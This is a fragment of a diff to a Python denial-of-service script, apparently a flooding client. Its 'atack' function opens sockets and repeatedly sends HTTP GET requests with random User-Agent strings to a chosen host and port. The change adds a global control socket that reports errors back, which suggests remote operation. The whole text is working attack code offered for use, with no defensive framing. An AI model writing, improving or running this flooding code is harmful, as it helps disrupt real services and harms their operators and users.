@@ -28,12 +28,14 @@ Connection: keep-alive
 
 
 def usage(s):
-    s.send(str.encode("Check the IP and port!"))
+    global soc 
+    soc.send(str.encode("Check the IP and port!"))
     
 
 def atack():
     global host 
     global port 
+    global soc
     ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     message = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
                 'utf-8')
@@ -42,8 +44,8 @@ def atack():
         ddos.send(message)
         ddos.sendto(message, (host, int(port)))
         ddos.send(message)
-    except Exception as e:
-        print(e)
+    except:
+        usage(soc)
     ddos.close()  
 
 
